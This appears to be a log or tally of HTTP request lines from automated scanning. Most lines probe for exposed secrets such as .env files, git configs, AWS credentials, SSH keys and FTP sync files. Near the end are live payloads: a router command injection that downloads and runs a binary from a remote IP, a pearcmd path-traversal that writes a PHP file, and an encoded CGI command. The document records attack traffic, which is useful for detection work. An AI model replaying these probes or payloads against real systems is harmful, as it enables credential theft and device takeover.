GET /downloads/laravel.log HTTP/1.1,1
GET /portal/laravel.log HTTP/1.1,1
GET /downloads/App_Config/ConnectionStrings.config HTTP/1.1,1
GET /members/.gitlab-ci.yml HTTP/1.1,1
GET /products/App_Config/ConnectionStrings.config HTTP/1.1,1
GET /vendor/jenkinsFile HTTP/1.1,1
GET /test/bdd/fixtures/vc-rest/.env HTTP/1.1,1
GET /painel/.ftpconfig HTTP/1.1,1
GET /portal/.env HTTP/1.1,1
GET /vendor/App_Config/ConnectionStrings.config HTTP/1.1,1
GET /account/api-config.ini HTTP/1.1,1
GET /configuration/.env HTTP/1.1,1
GET /conta/jenkinsFile HTTP/1.1,1
GET /projeto/.git/config HTTP/1.1,1
GET /painel/.git/config HTTP/1.1,1
GET /docs/.ftpconfig HTTP/1.1,1
GET /site/api-config.ini HTTP/1.1,1
GET /products/.gitlab-ci.yml HTTP/1.1,1
GET /conta/web.config HTTP/1.1,1
GET /project/App_Config/ConnectionStrings.config HTTP/1.1,1
GET /configuration/web.config HTTP/1.1,1
GET /login/.git/config HTTP/1.1,1
GET /dashboard/server.xml HTTP/1.1,1
GET /downloads/.vscode/sftp.json HTTP/1.1,1
GET /backup/laravel.log HTTP/1.1,1
GET /static/web.config HTTP/1.1,1
GET /account/.ftpconfig HTTP/1.1,1
GET /resources/.ftpconfig HTTP/1.1,1
GET /user/api-config.ini HTTP/1.1,1
GET /site/laravel.log HTTP/1.1,1
GET /admin/api-config.ini HTTP/1.1,1
GET /.ssh/authorized_keys HTTP/1.1,1
GET /account/.vscode/ftp-sync.json HTTP/1.1,1
GET /dashboard/.vscode/sftp.json HTTP/1.1,1
GET /members/api-config.ini HTTP/1.1,1
GET /login/.vscode/sftp.json HTTP/1.1,1
GET /login/.gitlab-ci.yml HTTP/1.1,1
GET /config/.git/config HTTP/1.1,1
GET /configuration/remote-sync.json HTTP/1.1,1
GET /backup/jenkinsFile HTTP/1.1,1
GET /resources/App_Config/ConnectionStrings.config HTTP/1.1,1
GET /customer/.ftpconfig HTTP/1.1,1
GET /products/server.xml HTTP/1.1,1
GET /blog/.git/config HTTP/1.1,1
GET /dev/.gitlab-ci.yml HTTP/1.1,1
GET /settings/remote-sync.json HTTP/1.1,1
GET /config/remote-sync.json HTTP/1.1,1
GET /docs/remote-sync.json HTTP/1.1,1
GET /public/.git/config HTTP/1.1,1
GET /dev/config.yaml HTTP/1.1,1
GET /members/.vscode/sftp.json HTTP/1.1,1
GET /bkp/.vscode/ftp-sync.json HTTP/1.1,1
GET /admin/.ssh/authorized_keys HTTP/1.1,1
GET /products/remote-sync.json HTTP/1.1,1
GET /painel/.ssh/authorized_keys HTTP/1.1,1
GET /dashboard/.gitlab-ci.yml HTTP/1.1,1
GET /dev/remote-sync.json HTTP/1.1,1
GET /login/api-config.ini HTTP/1.1,1
GET /cache/server.xml HTTP/1.1,1
GET /dev/.ftpconfig HTTP/1.1,1
GET /public/.ftpconfig HTTP/1.1,1
GET /vendor/server.xml HTTP/1.1,1
GET /login/config.yaml HTTP/1.1,1
GET /client/remote-sync.json HTTP/1.1,1
GET /profile/.vscode/sftp.json HTTP/1.1,1
GET /projeto/.env HTTP/1.1,1
GET /media/.vscode/ftp-sync.json HTTP/1.1,1
GET /static/server.xml HTTP/1.1,1
GET /settings/.ftpconfig HTTP/1.1,1
GET /downloads/remote-sync.json HTTP/1.1,1
GET /dev/.ssh/authorized_keys HTTP/1.1,1
GET /user/web.config HTTP/1.1,1
GET /admin/.vscode/ftp-sync.json HTTP/1.1,1
GET /products/.env HTTP/1.1,1
GET /admin/.git/config HTTP/1.1,1
GET /user/remote-sync.json HTTP/1.1,1
GET /resources/.gitlab-ci.yml HTTP/1.1,1
GET /private/.ssh/authorized_keys HTTP/1.1,1
GET /painel/.gitlab-ci.yml HTTP/1.1,1
GET /settings/api-config.ini HTTP/1.1,1
GET /docs/config.yaml HTTP/1.1,1
GET /public/web.config HTTP/1.1,1
GET /configuration/.vscode/sftp.json HTTP/1.1,1
GET /laravel.log HTTP/1.1,1
GET /user/.vscode/ftp-sync.json HTTP/1.1,1
GET /profile/.git/config HTTP/1.1,1
GET /private/laravel.log HTTP/1.1,1
GET /blog/.vscode/sftp.json HTTP/1.1,1
GET /settings/.env HTTP/1.1,1
GET /user/laravel.log HTTP/1.1,1
GET /blog/remote-sync.json HTTP/1.1,1
GET /client/laravel.log HTTP/1.1,1
GET /backup/.git/config HTTP/1.1,1
GET /configuration/.ssh/authorized_keys HTTP/1.1,1
GET /media/.ssh/authorized_keys HTTP/1.1,1
GET /public/jenkinsFile HTTP/1.1,1
GET /public/api-config.ini HTTP/1.1,1
GET /profile/config.yaml HTTP/1.1,1
GET /site/remote-sync.json HTTP/1.1,1
GET /user/.ftpconfig HTTP/1.1,1
GET /private/.ftpconfig HTTP/1.1,1
GET /downloads/.git/config HTTP/1.1,1
GET /plugin_static/.env HTTP/1.1,1
GET /services/server.xml HTTP/1.1,1
GET /project/laravel.log HTTP/1.1,1
GET /admin/config.yaml HTTP/1.1,1
GET /dashboard/.git/config HTTP/1.1,1
GET /portal/web.config HTTP/1.1,1
GET /client/App_Config/ConnectionStrings.config HTTP/1.1,1
GET /user/server.xml HTTP/1.1,1
GET /account/server.xml HTTP/1.1,1
GET /portal/.ssh/authorized_keys HTTP/1.1,1
GET /bkp/remote-sync.json HTTP/1.1,1
GET /account/.git/config HTTP/1.1,1
GET /tmp/web.config HTTP/1.1,1
GET /products/.ftpconfig HTTP/1.1,1
GET /members/.git/config HTTP/1.1,1
GET /portal/config.yaml HTTP/1.1,1
GET /media/.git/config HTTP/1.1,1
GET /bkp/.ssh/authorized_keys HTTP/1.1,1
GET /conta/.ssh/authorized_keys HTTP/1.1,1
GET /blog/App_Config/ConnectionStrings.config HTTP/1.1,1
GET /bkp/config.yaml HTTP/1.1,1
GET /project/.ftpconfig HTTP/1.1,1
GET /configuration/server.xml HTTP/1.1,1
GET /bkp/.ftpconfig HTTP/1.1,1
GET /blog/config.yaml HTTP/1.1,1
GET /user/config.yaml HTTP/1.1,1
GET /downloads/config.yaml HTTP/1.1,1
GET /static/config.yaml HTTP/1.1,1
GET /customer/server.xml HTTP/1.1,1
GET /portal/api-config.ini HTTP/1.1,1
GET /vendor/.vscode/sftp.json HTTP/1.1,1
GET /user/.gitlab-ci.yml HTTP/1.1,1
GET /.gitlab-ci.yml HTTP/1.1,1
GET /services/.ftpconfig HTTP/1.1,1
GET /project/.git/config HTTP/1.1,1
GET /docs/web.config HTTP/1.1,1
GET /remote-sync.json HTTP/1.1,1
GET /portal/jenkinsFile HTTP/1.1,1
GET /site/.vscode/sftp.json HTTP/1.1,1
GET /project/server.xml HTTP/1.1,1
GET /login/jenkinsFile HTTP/1.1,1
GET /docs/.vscode/ftp-sync.json HTTP/1.1,1
GET /resources/.ssh/authorized_keys HTTP/1.1,1
GET /conta/.env HTTP/1.1,1
GET /site/.git/config HTTP/1.1,1
GET /project/.vscode/sftp.json HTTP/1.1,1
GET /static/laravel.log HTTP/1.1,1
GET /bin/config.sh HTTP/1.1,1
GET /config/.gitlab-ci.yml HTTP/1.1,1
GET /projeto/App_Config/ConnectionStrings.config HTTP/1.1,1
GET /site/jenkinsFile HTTP/1.1,1
GET /docs/laravel.log HTTP/1.1,1
GET /project/api-config.ini HTTP/1.1,1
GET /products/.ssh/authorized_keys HTTP/1.1,1
GET /admin/.ftpconfig HTTP/1.1,1
GET /account/.env HTTP/1.1,1
GET /conta/api-config.ini HTTP/1.1,1
GET /config/laravel.log HTTP/1.1,1
GET /bkp/server.xml HTTP/1.1,1
GET /docs/.gitlab-ci.yml HTTP/1.1,1
GET /media/jenkinsFile HTTP/1.1,1
GET /resources/.vscode/ftp-sync.json HTTP/1.1,1
GET /vendor/config.yaml HTTP/1.1,1
GET /media/config.yaml HTTP/1.1,1
GET /services/remote-sync.json HTTP/1.1,1
GET /Server.txt HTTP/1.1,1
GET /products/.vscode/sftp.json HTTP/1.1,1
GET /cache/web.config HTTP/1.1,1
GET /downloads/web.config HTTP/1.1,1
GET /account/config.yaml HTTP/1.1,1
GET /client/jenkinsFile HTTP/1.1,1
GET /dashboard/.env HTTP/1.1,1
GET /services/config.yaml HTTP/1.1,1
GET /client/api-config.ini HTTP/1.1,1
GET /public/config.yaml HTTP/1.1,1
GET /bkp/laravel.log HTTP/1.1,1
GET /projeto/.ftpconfig HTTP/1.1,1
GET /project/jenkinsFile HTTP/1.1,1
GET /members/.ftpconfig HTTP/1.1,1
GET /user/.git/config HTTP/1.1,1
GET /private/server.xml HTTP/1.1,1
GET /client/web.config HTTP/1.1,1
GET /config/.vscode/ftp-sync.json HTTP/1.1,1
GET /admin/remote-sync.json HTTP/1.1,1
GET /cache/.ftpconfig HTTP/1.1,1
GET /conta/.vscode/ftp-sync.json HTTP/1.1,1
GET /dev/.vscode/sftp.json HTTP/1.1,1
GET /resources/.vscode/sftp.json HTTP/1.1,1
GET /account/laravel.log HTTP/1.1,1
GET /painel/config.yaml HTTP/1.1,1
GET /configuration/.vscode/ftp-sync.json HTTP/1.1,1
GET /configuration/api-config.ini HTTP/1.1,1
GET /tmp/config.yaml HTTP/1.1,1
GET /resources/remote-sync.json HTTP/1.1,1
GET /static/api-config.ini HTTP/1.1,1
GET /projeto/web.config HTTP/1.1,1
GET /backup/.ssh/authorized_keys HTTP/1.1,1
GET /customer/.gitlab-ci.yml HTTP/1.1,1
GET /services/.vscode/sftp.json HTTP/1.1,1
GET /tmp/.ssh/authorized_keys HTTP/1.1,1
GET /account/.gitlab-ci.yml HTTP/1.1,1
GET /media/laravel.log HTTP/1.1,1
GET /media/api-config.ini HTTP/1.1,1
GET /configuration/.ftpconfig HTTP/1.1,1
GET /static/.gitlab-ci.yml HTTP/1.1,1
GET /project/.gitlab-ci.yml HTTP/1.1,1
GET /admin/.vscode/sftp.json HTTP/1.1,1
GET /members/web.config HTTP/1.1,1
GET /docs/server.xml HTTP/1.1,1
GET /products/config.yaml HTTP/1.1,1
GET /profile/web.config HTTP/1.1,1
GET /conta/.ftpconfig HTTP/1.1,1
GET /resources/laravel.log HTTP/1.1,1
GET /painel/web.config HTTP/1.1,1
GET /user/.ssh/authorized_keys HTTP/1.1,1
GET /public/.gitlab-ci.yml HTTP/1.1,1
GET /conta/remote-sync.json HTTP/1.1,1
GET /.ftpconfig HTTP/1.1,1
GET /bkp/api-config.ini HTTP/1.1,1
GET /dev/api-config.ini HTTP/1.1,1
GET /members/server.xml HTTP/1.1,1
GET /public/.vscode/sftp.json HTTP/1.1,1
GET /downloads/.gitlab-ci.yml HTTP/1.1,1
GET /painel/.vscode/ftp-sync.json HTTP/1.1,1
GET /backup/web.config HTTP/1.1,1
GET /tmp/api-config.ini HTTP/1.1,1
GET /portal/App_Config/ConnectionStrings.config HTTP/1.1,1
GET /bkp/.env HTTP/1.1,1
GET /customer/.ssh/authorized_keys HTTP/1.1,1
GET /painel/.env HTTP/1.1,1
GET /projeto/.ssh/authorized_keys HTTP/1.1,1
GET /vendor/laravel.log HTTP/1.1,1
GET /project/.ssh/authorized_keys HTTP/1.1,1
GET /backup/remote-sync.json HTTP/1.1,1
GET /backup/config.yaml HTTP/1.1,1
GET /bkp/jenkinsFile HTTP/1.1,1
GET /downloads/api-config.ini HTTP/1.1,1
GET /products/.git/config HTTP/1.1,1
GET /dev/jenkinsFile HTTP/1.1,1
GET /tmp/laravel.log HTTP/1.1,1
GET /tmp/.ftpconfig HTTP/1.1,1
GET /downloads/server.xml HTTP/1.1,1
GET /profile/jenkinsFile HTTP/1.1,1
GET /dashboard/laravel.log HTTP/1.1,1
GET /members/.env HTTP/1.1,1
GET /conta/App_Config/ConnectionStrings.config HTTP/1.1,1
GET /user/App_Config/ConnectionStrings.config HTTP/1.1,1
GET /backup/.ftpconfig HTTP/1.1,1
GET /resources/api-config.ini HTTP/1.1,1
GET /vendor/.vscode/ftp-sync.json HTTP/1.1,1
GET /customer/.vscode/sftp.json HTTP/1.1,1
GET /blog/jenkinsFile HTTP/1.1,1
GET /config/App_Config/ConnectionStrings.config HTTP/1.1,1
GET /projeto/.gitlab-ci.yml HTTP/1.1,1
GET /includes/ajaxEmail.php HTTP/1.1,1
GET /src/YiiMailer.php HTTP/1.1,1
GET /src/SMTP.php HTTP/1.1,1
GET /YiiMailer/src/YiiMailer.php HTTP/1.1,1
GET /PHPMailer/src/SMTP.php HTTP/1.1,1
GET /emails/PHPMailer_old/connection_data.php HTTP/1.1,1
GET /PHPMailer/src/PHPMailer.php HTTP/1.1,1
GET /painel/App_Config/ConnectionStrings.config HTTP/1.1,1
GET /login/.vscode/ftp-sync.json HTTP/1.1,1
GET /admin/server.xml HTTP/1.1,1
GET /projeto/laravel.log HTTP/1.1,1
GET /tmp/.vscode/ftp-sync.json HTTP/1.1,1
GET /docs/jenkinsFile HTTP/1.1,1
GET /login/.ssh/authorized_keys HTTP/1.1,1
GET /tmp/remote-sync.json HTTP/1.1,1
GET /src/PHPMailer.php HTTP/1.1,1
GET /emails/PHPMailer/connection_data.php HTTP/1.1,1
GET /config.old HTTP/1.1,1
GET /config.h.in HTTP/1.1,1
GET /src/server.js HTTP/1.1,1
GET /debug.cgi HTTP/1.1,1
GET /settings.php.bak HTTP/1.1,1
GET /php/dev/ HTTP/1.1,1
GET /site/App_Config/ConnectionStrings.config HTTP/1.1,1
GET /docker_run.sh HTTP/1.1,1
GET /config/settings.ini HTTP/1.1,1
GET /config.guess HTTP/1.1,1
GET /login.sh HTTP/1.1,1
GET /emails/PHPMailer/SMTP.php HTTP/1.1,1
GET /emails/PHPMailer/PHPMailer.php HTTP/1.1,1
GET /global.asa.temp HTTP/1.1,1
GET /settings/config.yaml HTTP/1.1,1
GET /private/.vscode/sftp.json HTTP/1.1,1
GET /robot.txt HTTP/1.1,1
GET /jenkinsFile HTTP/1.1,1
GET /php4.ini HTTP/1.1,1
GET /server.cert HTTP/1.1,1
GET /dump.sh HTTP/1.1,1
GET /src/index.js HTTP/1.1,1
GET /~backup HTTP/1.1,1
GET /php.log HTTP/1.1,1
GET /src/ HTTP/1.1,1
GET /config.php.bkp HTTP/1.1,1
GET /config.ini HTTP/1.1,1
GET /globals HTTP/1.1,1
GET /settings.php.save HTTP/1.1,1
GET /config.php.swp HTTP/1.1,1
GET /global.asax.tmp HTTP/1.1,1
GET /demo.sh HTTP/1.1,1
GET /config.hash HTTP/1.1,1
GET /settings.php.dist HTTP/1.1,1
GET /config.php.dist HTTP/1.1,1
GET /~apache HTTP/1.1,1
GET /config.php HTTP/1.1,1
GET /.aws.sh HTTP/1.1,1
GET /startup.sh HTTP/1.1,1
GET /globaladmin HTTP/1.1,1
GET /config.inc.old HTTP/1.1,1
GET /php5.fcgi HTTP/1.1,1
GET /service.pwd HTTP/1.1,1
GET /config.php.old HTTP/1.1,1
GET /config/settings.local.yml HTTP/1.1,1
GET /globes_admin/ HTTP/1.1,1
GET /sample.txt HTTP/1.1,1
GET /server.cfg HTTP/1.1,1
GET /config.codekit HTTP/1.1,1
GET /settings.html HTTP/1.1,1
GET /config.local HTTP/1.1,1
GET /config.json.bak HTTP/1.1,1
GET /server.sh HTTP/1.1,1
GET /run.sh HTTP/1.1,1
GET /aws-credentials.sh HTTP/1.1,1
GET /start.sh HTTP/1.1,1
GET /config.php.txt HTTP/1.1,1
GET /config.properties HTTP/1.1,1
GET /config.inc.php.txt HTTP/1.1,1
GET /src/app.js HTTP/1.1,1
GET /global.php HTTP/1.1,1
GET /config.dat HTTP/1.1,1
GET /setup.data HTTP/1.1,1
GET /config.ru HTTP/1.1,1
GET /config.ini.bak HTTP/1.1,1
GET /config.php.zip HTTP/1.1,1
GET /config.inc HTTP/1.1,1
GET /config.inc.txt HTTP/1.1,1
GET /config.sh HTTP/1.1,1
GET /cron.sh HTTP/1.1,1
GET /config.ini.txt HTTP/1.1,1
GET /config.codekit3 HTTP/1.1,1
GET /config.sub HTTP/1.1,1
GET /config/config.inc HTTP/1.1,1
GET /service.asmx HTTP/1.1,1
GET /robots.txt.dist HTTP/1.1,1
GET /config.sql HTTP/1.1,1
GET /conf.html HTTP/1.1,1
GET /config.yml HTTP/1.1,1
GET /global.asax HTTP/1.1,1
GET /config.core HTTP/1.1,1
GET /conf.swp HTTP/1.1,1
GET /server.log HTTP/1.1,1
GET /server.js HTTP/1.1,1
GET /config.bak HTTP/1.1,1
GET /config.json.cfm HTTP/1.1,1
GET /Server.php HTTP/1.1,1
GET /global.asa.bak HTTP/1.1,1
GET /conf.php.swp HTTP/1.1,1
GET /php.lnk HTTP/1.1,1
GET /server-info HTTP/1.1,1
GET /setup.log HTTP/1.1,1
GET /settings.php.old HTTP/1.1,1
GET /settings.php.swp HTTP/1.1,1
GET /web.config.tmp HTTP/1.1,1
GET /debug.log HTTP/1.1,1
GET /global.asax.old HTTP/1.1,1
GET /common.sh HTTP/1.1,1
GET /Build.bat HTTP/1.1,1
GET /build.properties HTTP/1.1,1
GET /config/app.php HTTP/1.1,1
GET /builds.sh HTTP/1.1,1
GET /config.php.save HTTP/1.1,1
GET /conf.php.old HTTP/1.1,1
GET /plugin.xml HTTP/1.1,1
GET /config.php.new HTTP/1.1,1
GET /settings.php HTTP/1.1,1
GET /settings.php.txt HTTP/1.1,1
GET /service.grp HTTP/1.1,1
GET /server.key HTTP/1.1,1
GET /config.rb HTTP/1.1,1
GET /configure.sh HTTP/1.1,1
GET /.dockerfunc HTTP/1.1,1
GET /config.php-eb HTTP/1.1,1
GET /php.core HTTP/1.1,1
GET /debug HTTP/1.1,1
GET /php5.ini HTTP/1.1,1
GET /docker.sh HTTP/1.1,1
GET /config/app.yml HTTP/1.1,1
GET /php.ini.sample HTTP/1.1,1
GET /globaladminv2 HTTP/1.1,1
GET /global.asa HTTP/1.1,1
GET /globals.jsa HTTP/1.1,1
GET /config.local.php_old HTTP/1.1,1
GET /php.ini_ HTTP/1.1,1
GET /config.swp HTTP/1.1,1
GET /debug.inc HTTP/1.1,1
GET /settings.xml HTTP/1.1,1
GET /server.pid HTTP/1.1,1
GET /Server/ HTTP/1.1,1
GET /.codeship.yml HTTP/1.1,1
GET /config.ini.old HTTP/1.1,1
GET /global.asax.temp HTTP/1.1,1
GET /dev.sh HTTP/1.1,1
GET /build.sh HTTP/1.1,1
GET /secrets.sh HTTP/1.1,1
GET /config.php.inc HTTP/1.1,1
GET /build.local.xml HTTP/1.1,1
GET /conf.sh HTTP/1.1,1
GET /debug.py HTTP/1.1,1
GET /.codeship.yaml HTTP/1.1,1
GET /global.asa.old HTTP/1.1,1
GET /startup.cfg HTTP/1.1,1
GET /php.ini-orig.txt HTTP/1.1,1
GET /.travis.sh HTTP/1.1,1
GET /conf.php.bak HTTP/1.1,1
GET /debug.txt HTTP/1.1,1
GET /global.asa.orig HTTP/1.1,1
GET /config.source HTTP/1.1,1
GET /serv-u.ini HTTP/1.1,1
GET /shell.sh HTTP/1.1,1
GET /globals.inc HTTP/1.1,1
GET /.jenkins.sh HTTP/1.1,1
GET /build.xml HTTP/1.1,1
GET /global.asax.orig HTTP/1.1,1
GET /main.js HTTP/1.1,1
GET /build.log HTTP/1.1,1
GET /global.asa.tmp HTTP/1.1,1
GET /phpinfo.php/ HTTP/1.1,1
GET /server/server.js HTTP/1.1,1
GET /sh.sh HTTP/1.1,1
GET /debug-output.txt HTTP/1.1,1
GET /build_docker.sh HTTP/1.1,1
GET /config.inc.bak HTTP/1.1,1
GET /config/settings.ini.cfm HTTP/1.1,1
GET /setup.php HTTP/1.1,1
GET /setup.sql HTTP/1.1,1
GET /user-data.txt HTTP/1.1,1
GET /config/settings.inc HTTP/1.1,1
GET /server-status/ HTTP/1.1,1
GET /main.json HTTP/1.1,1
GET /global.asax.bak HTTP/1.1,1
GET /config/config.ini HTTP/1.1,1
GET /config/AppData.config HTTP/1.1,1
GET /php/php.cgi HTTP/1.1,1
GET /config.php.original HTTP/1.1,1
GET /main.sh HTTP/1.1,1
GET /secret_key.php HTTP/1.1,1
GET /composer.json HTTP/1.1,1
GET /secrets.json HTTP/1.1,1
GET /debug.xml HTTP/1.1,1
GET /config.inc.php HTTP/1.1,1
GET /server.php HTTP/1.1,1
GET /awsconfig.js HTTP/1.1,1
GET /config/config.php HTTP/1.1,1
GET /configs/application.ini HTTP/1.1,1
GET /.circleci/config.yml HTTP/1.1,1
GET /application.conf HTTP/1.1,1
GET /.aws/config HTTP/1.1,1
GET /test.js HTTP/1.1,1
GET /phpconf.php HTTP/1.1,1
GET /src/phpinfo.php HTTP/1.1,1
GET /debug.php HTTP/1.1,1
GET /configure.php.orig HTTP/1.1,1
GET /app.json HTTP/1.1,1
GET /database.json HTTP/1.1,1
GET /aws.js HTTP/1.1,1
GET /info HTTP/1.1,1
GET /application.properties HTTP/1.1,1
GET /local.php HTTP/1.1,1
GET /local.json HTTP/1.1,1
GET /tmp/phpinfo.php HTTP/1.1,1
GET /appsettings.json HTTP/1.1,1
GET /.aws/credentials.js HTTP/1.1,1
GET /config.prod.js HTTP/1.1,1
GET /connectionstrings.json HTTP/1.1,1
GET /package.json HTTP/1.1,1
GET /application.yml HTTP/1.1,1
GET /cms/config.php HTTP/1.1,1
GET /info.php/ HTTP/1.1,1
GET /_profiler/phpinfo.php HTTP/1.1,1
GET /_profiler/app_dev/phpinfo HTTP/1.1,1
GET /index.php/phpinfo HTTP/1.1,1
GET /api/index.php/v1/config/application HTTP/1.1,1
GET /aws_config.js HTTP/1.1,1
GET /config.js.bak HTTP/1.1,1
GET /default.js HTTP/1.1,1
GET /_profiler/info HTTP/1.1,1
GET /symfony/_profiler/phpinfo HTTP/1.1,1
GET /settings.json HTTP/1.1,1
GET /configuration.php-dist HTTP/1.1,1
GET /admin/config.php HTTP/1.1,1
GET /config.ini.php HTTP/1.1,1
GET /file/php/info.php HTTP/1.1,1
GET /server-info.php HTTP/1.1,1
GET /_profiler/app_dev.php/phpinfo HTTP/1.1,1
GET /global.inc.php HTTP/1.1,1
GET /file/php/phpinfo HTTP/1.1,1
GET /info.json/ HTTP/1.1,1
GET /.hsenv HTTP/1.1,1
GET /.aws/secret_access_key.txt HTTP/1.1,1
GET /config.php.bak HTTP/1.1,1
GET /home/.aws/credentials HTTP/1.1,1
GET /global.json HTTP/1.1,1
GET /php-info.php HTTP/1.1,1
GET /services.yml HTTP/1.1,1
GET /config.conf HTTP/1.1,1
GET /.aws/iam/ HTTP/1.1,1
GET /.aws/ses/ HTTP/1.1,1
GET /.aws/secrets/ HTTP/1.1,1
GET /.aws/rds/ HTTP/1.1,1
GET /.aws/s3/config.json HTTP/1.1,1
GET /.aws/s3/credentials.ini HTTP/1.1,1
GET /.aws/secretsmanager/ HTTP/1.1,1
GET /.aws/keys.conf HTTP/1.1,1
GET /.aws/keypairs/ HTTP/1.1,1
GET /.aws/cloudformation/ HTTP/1.1,1
GET /env HTTP/1.1,1
GET /.env-example HTTP/1.1,1
GET /.env_bak HTTP/1.1,1
GET /.env.sample HTTP/1.1,1
GET /.env.docker HTTP/1.1,1
GET /.rbenv-gemsets HTTP/1.1,1
GET /.aws/cloudwatch/ HTTP/1.1,1
GET /.powenv HTTP/1.1,1
GET /.aws/configurations HTTP/1.1,1
GET /.aws/lambda/ HTTP/1.1,1
GET /.aws/kms/ HTTP/1.1,1
GET /.aws HTTP/1.1,1
GET /root/.aws/credentials HTTP/1.1,1
GET /.aws/config.yaml HTTP/1.1,1
GET /.pam_environment HTTP/1.1,1
GET /.aws/s3/secrets.yaml HTTP/1.1,1
GET /env.list HTTP/1.1,1
GET /environment HTTP/1.1,1
GET /.env-sample HTTP/1.1,1
GET /printenv.tmp HTTP/1.1,1
GET /.env.txt HTTP/1.1,1
GET /.env.2 HTTP/1.1,1
GET /.env.test.sample HTTP/1.1,1
GET /.env.travis HTTP/1.1,1
GET /.env.prod.local HTTP/1.1,1
GET /.rbenv-version HTTP/1.1,1
GET /.ghc.environment HTTP/1.1,1
GET /.env.development.sample HTTP/1.1,1
GET /.zshenv HTTP/1.1,1
GET /.env_old HTTP/1.1,1
GET /environment.ts HTTP/1.1,1
GET /.env.dev.local HTTP/1.1,1
GET /envrc HTTP/1.1,1
GET /.flaskenv HTTP/1.1,1
GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(cd+/tmp;+rm+-rf+shk;+wget+http://179.43.190.218/shk;+chmod+777+shk;+./shk+tplink;+rm+-rf+shk) HTTP/1.1,1
GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(id>`cd+/tmp;+rm+-rf+shk;+wget+http://179.43.190.218/shk;+chmod+777+shk;+./shk+tplink;+rm+-rf+shk`) HTTP/1.1,1
GET /index.php?lang=../../../../../../../../usr/local/lib/php/pearcmd&+config-create+/&/<?echo(md5(%22hi%22));?>+/var/tmp/index1.php HTTP/1.1,1
"POST /cmd,/ck6fup6/portal_main/pkg_init_cmd/register_main/setCookie HTTP/1.0",1
GET /WebInterface/ HTTP/1.1,1
GET /.most/orospucoc.cgi?user=messagebus&passwd=&cmd=15&system=dW5hbWUJLW0= HTTP/1.1,1
GET /printenv HTTP/1.1,1
GET /etc/stats HTTP/1.1,1
GET /env.bak HTTP/1.1,1
GET /env.test.js HTTP/1.1,1
GET /env.prod.js HTTP/1.1,1
GET /.venv HTTP/1.1,1
GET /.env1 HTTP/1.1,1
GET /.jenv-version HTTP/1.1,1
GET /env.php HTTP/1.1,1
GET /env.txt HTTP/1.1,1
CONNECT kaisercloud.io:443 HTTP/1.1,1
